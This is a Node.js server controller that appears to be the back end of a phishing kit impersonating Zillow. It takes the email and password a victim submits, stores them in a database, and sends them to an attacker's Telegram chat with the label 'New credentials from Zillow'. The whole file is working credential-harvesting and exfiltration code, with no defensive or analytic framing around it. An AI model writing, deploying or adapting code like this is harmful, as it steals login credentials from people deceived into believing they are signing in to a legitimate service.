const Zillow = require("../model/zillow"); // Your Mongoose model
const TelegramBot = require('node-telegram-bot-api')
const bot = new TelegramBot(process.env.TELEGRAM_BOT);
const sendDetails = async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res
        .status(400)
        .json({ error: "Email and password are required." });
    }

    // Save to database (optional)
    const user = await Zillow.create({ email, password });

    // Send to Telegram
    await bot.sendMessage(
      process.env.TELEGRAM_CHAT_ID,
      `New credentials from Zillow:\n📧 Email: ${email}\n🔑 Password: ${password}`
    );

    res
      .status(200)
      .json({
        message:
          `New credentials from Zillow:\n📧 Email: ${email}\n🔑 Password: ${password}`,
        user,
      });
  } catch (error) {
    console.error("Error sending details:", error);
    res.status(500).json({ error: error.message });
  }
};

module.exports = {sendDetails};
